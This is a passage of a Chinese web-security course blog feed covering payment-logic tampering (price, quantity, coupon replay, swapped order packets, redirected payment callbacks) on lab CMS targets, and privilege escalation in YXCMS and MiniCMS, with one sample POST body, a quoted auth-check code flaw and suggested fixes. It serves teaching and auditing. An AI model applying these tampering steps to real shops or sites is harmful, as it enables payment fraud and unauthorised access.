alt="在这里插入图片描述"></p><p>点击购买大米手机cms</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772395304973.png" alt="在这里插入图片描述"></p><p>观察price&#x3D;5400对应价格，抓包将其修改</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772395978706.png" alt="在这里插入图片描述"></p><p>放包后发现价格变动了，成功修改价格</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NzU2NjI4,size_16,color_FFFFFF,t_70-16772396271589.png" alt="在这里插入图片描述"></p><p>同样的，抓取购买大米测试产品的数据包</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224195747044.png" alt="image-20230224195747044"></p><p>如果在修改数量和价格上面行不通(或者说商品不展示这些参数)，可以尝试以低价(5400)购买高价(6000)的物品，将数据包的关于商品信息的替换，替换除了此处以外的其东西</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224201800675.png" alt="image-20230224201800675"></p><p>观察从6000变成了5400</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224201927150.png" alt="image-20230224201927150"></p><p>还可以测试支付接口的地方，将vx，zfb接口改为自己私人支付接口(但是不一定成功)</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224204836116.png" alt="image-20230224204836116"></p><p>下面数据包中的notify_url是支付宝的支付接口，尝试更改，此处不进行尝试</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230224205203855.png" alt="image-20230224205203855"></p><p>支付宝接口中return_url和notify_url的作用：(<a href="https://blog.csdn.net/KeleQAQ/article/details/111500581">https://blog.csdn.net/KeleQAQ/article/details/111500581</a>)</p><h5 id="修改方式-订单号-amp-数量-amp-优惠券"><a href="#修改方式-订单号-amp-数量-amp-优惠券" class="headerlink" title="#修改方式-订单号&amp;数量&amp;优惠券"></a>#修改方式-订单号&amp;数量&amp;优惠券</h5><p>靶场：niushop</p><p>1、修改数量达到价格变动</p><p>无价格可改，尝试改动数量</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307194744046.png" alt="image-20230307194744046"></p><p>发包后价格改变</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307194821374.png" alt="image-20230307194821374"></p><p>2、修改订单达到底价购买</p><p>3、优惠券重放使用&amp;重领使用</p><p>优惠券利用：</p><p>只能领取一次（找其规律，看是否每个优惠券都有一个序列id，用完一个会生产一个id值更大的）</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307222035061.png" alt="image-20230307222035061"></p><p>重复使用-重放数据包（重复将这个优惠券的数据包重复发送）</p><p>防御的手段是：将优惠券编码加密，让攻击者猜不到，使用以后数据库进行删除</p><p>当没有优惠卷提交订单时：</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210351399.png" alt="image-20230307210351399"></p><p>post内容：goods_sku_list&#x3D;1%3A1&amp;leavemessage&#x3D;&amp;use_coupon&#x3D;0&amp;integral&#x3D;0&amp;account_balance&#x3D;0&amp;pay_type&#x3D;0&amp;buyer_invoice&#x3D;&amp;pick_up_id&#x3D;0&amp;express_company_id&#x3D;1</p><p>当使用优惠券时：<img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210334233.png" alt="image-20230307210334233"></p><p>post内容：goods_sku_list&#x3D;1%3A1&amp;leavemessage&#x3D;&amp;use_coupon&#x3D;1&amp;integral&#x3D;0&amp;account_balance&#x3D;0&amp;pay_type&#x3D;0&amp;buyer_invoice&#x3D;&amp;pick_up_id&#x3D;0&amp;express_company_id&#x3D;1</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307210425866.png" alt="image-20230307210425866"></p><p>其中&amp;use_coupon&#x3D;参数代表是否使用了优惠券</p><p>没有优惠券后，将0改为1</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307211240231.png" alt="image-20230307211240231"></p><p>价格少了1000</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307211318559.png" alt="image-20230307211318559"></p><p>当用完了优惠券时，而上一张优惠券的id是4</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221348703.png" alt="image-20230307221348703"></p><p>可以在没有优惠券的情况下修改&amp;use_coupon&#x3D;6</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221553239.png" alt="image-20230307221553239"></p><p>修改后发包发现价格同样减少</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307221646125.png" alt="image-20230307221646125"></p><p>同样存在，以低价格购买高价格，如将订单10000块和1000的数据包抓取</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223438661.png" alt="image-20230307223438661"></p><p>   将10000的数据包和1000的替换</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223322702.png" alt="image-20230307223322702"></p><p>最后支付价格变成了1000</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230307223539620.png" alt="image-20230307223539620"></p><h5 id="某实例-演示站交易支付逻辑安全"><a href="#某实例-演示站交易支付逻辑安全" class="headerlink" title="#某实例-演示站交易支付逻辑安全"></a>#某实例-演示站交易支付逻辑安全</h5><p>奇乐CMS</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230308131551166.png" alt="image-20230308131551166"></p><p>修改成6</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230308131641740.png" alt="image-20230308131641740"></p><h5 id="代码审计-业务支付逻辑-amp-安全修复"><a href="#代码审计-业务支付逻辑-amp-安全修复" class="headerlink" title="#代码审计-业务支付逻辑&amp;安全修复"></a>#代码审计-业务支付逻辑&amp;安全修复</h5><p>1、金额以数据库定义为准（不接受修改的值）</p><p>此处价格可变量，可以修改，导致产生漏洞</p><p><img src="/../images/Day50-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2/image-20230308132202566.png" alt="image-20230308132202566"></p><p>2、购买数量限制为正整数</p><p>3、优惠券固定使用后删除</p><p>4、订单生成后检测对应值</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、商品购买-数量&amp;amp;价格&amp;amp;编号等&lt;/p&gt;
&lt;p&gt;2、支付模式-状态&amp;amp;接口&amp;amp;负数等&lt;/p&gt;</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day49 WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证</title>
    <link href="http://example.com/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/"/>
    <id>http://example.com/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/</id>
    <published>2023-02-02T17:53:34.000Z</published>
    <updated>2023-02-24T06:20:09.322Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、水平越权-同级用户权限共享</p><p>2、垂直越权-低高用户权限共享</p><p>3、访问控制-验证丢失&amp;取消验证</p><p>4、脆弱验证-Cookie&amp;Token&amp;Jwt等</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><h4 id="1、逻辑越权原理"><a href="#1、逻辑越权原理" class="headerlink" title="1、逻辑越权原理-"></a>1、逻辑越权原理-</h4><p>-水平越权：用户信息获取时未对用户与ID比较判断直接查询等</p><p>-垂直越权：数据库中用户类型编号接受篡改或高权限操作未验证等</p><h4 id="2、访问控制原理"><a href="#2、访问控制原理" class="headerlink" title="2、访问控制原理-"></a>2、访问控制原理-</h4><p>-验证丢失：未包含引用验证代码文件等</p><p>-取消验证：支持空口令,匿名,白名单等</p><h4 id="3、脆弱验证原理"><a href="#3、脆弱验证原理" class="headerlink" title="3、脆弱验证原理-"></a>3、脆弱验证原理-</h4><p>-Cookie&amp;Token&amp;Jwt：不安全的验证逻辑等</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/0.png" alt="img"></p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p> ➢ 权限-水平越权-YXCMS-检测数据比对弱</p><p>➢ 权限-垂直越权-MINICMS-权限操作无验证</p><p>➢ 未授权-访问控制-XHCMS-代码未引用验证</p><p>➢ 未授权-脆弱机制-XHCMS-Cookie脆弱验证</p><p>➢ 弱机制-空口令机制-Redis&amp;Weblogic弱机制</p><p>➢ 检测类-工具项目-Authz&amp;Secscan-Authcheck</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="权限-水平越权-YXCMS-检测数据比对弱"><a href="#权限-水平越权-YXCMS-检测数据比对弱" class="headerlink" title="#权限-水平越权-YXCMS-检测数据比对弱"></a>#权限-水平越权-YXCMS-检测数据比对弱</h4><p>只检测用户和ID对应关系，没检测当前操作用户是不是当前用户</p><p>环境靶场：YXCMS</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213349543.png" alt="image-20230221213349543"></p><p>进入会员中心</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213446404.png" alt="image-20230221213446404"></p><p>点击修改信息，用burp抓包，更改信息为别的用户，如数据库中的xiaodi002用户，并更改相关信息，id不知道的情况下可以猜测</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213824477.png" alt="image-20230221213824477"></p><p>查看原始数据库中的信息，原本xiaodi002的相关的信息</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221213544894.png" alt="image-20230221213544894"></p><p>burpsuite改完发包成功</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221214157953.png" alt="image-20230221214157953">刷新数据库，发现数据库中的xiaodi002用户信息被修改了为了burp中修改的数据，实现了水平越权</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221214309835.png" alt="image-20230221214309835"></p><p>漏洞原因：</p><p>在源码中找到用户名参数并跟踪nickname,发现接收的nickname 不是固定用户名，而是可变变量</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221220557785.png" alt="image-20230221220557785"></p><h4 id="权限-垂直越权-MINICMS-权限操作无验证"><a href="#权限-垂直越权-MINICMS-权限操作无验证" class="headerlink" title="#权限-垂直越权-MINICMS-权限操作无验证"></a>#权限-垂直越权-MINICMS-权限操作无验证</h4><p>后台数据包访问先执行后判断登录等于无效</p><p>1、有验证 逻辑顺序搞错了</p><p>此处的漏洞原因是2</p><p>环境靶场：minicms</p><p>发布一篇文章</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234220860.png" alt="image-20230221234220860"></p><p>复制回收(删除)文章的链接地址</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234315010.png" alt="image-20230221234315010"></p><p>用另一个浏览器打开登录地址，但是未登录</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234443265.png" alt="image-20230221234443265"></p><p>粘贴访问回收的地址，发现刚才发布的1111文章被删除了，实现了垂直越权</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230221234532508.png" alt="image-20230221234532508"></p><h6 id="漏洞成因分析审计："><a href="#漏洞成因分析审计：" class="headerlink" title="漏洞成因分析审计："></a>漏洞成因分析审计：</h6><p>主要的问题就在于权限判断是在head.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;On&quot;</span>); <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../mc-files/mc-conf.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;mc_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;mc_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$token</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$mc_config</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&#x27;_&#x27;</span>.<span class="variable">$mc_config</span>[<span class="string">&#x27;user_pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:index.php&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在post.php和page.php都出现了这么一个问题，等到他们本身的php代码都执行完之后，才在第188行进行require：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">&#x27;head.php&#x27;</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而如果要进行文章删除的功能，在require之前的代码中执行，因为造成了垂直越权的文章删除</p><h4 id="未授权-访问控制-XHCMS-代码未引用验证"><a href="#未授权-访问控制-XHCMS-代码未引用验证" class="headerlink" title="#未授权-访问控制-XHCMS-代码未引用验证"></a>#未授权-访问控制-XHCMS-代码未引用验证</h4><p>2、没有验证 触发当前操作的用户权限</p><p>在代码中注释掉这行验证登录的代码文件</p><p><img 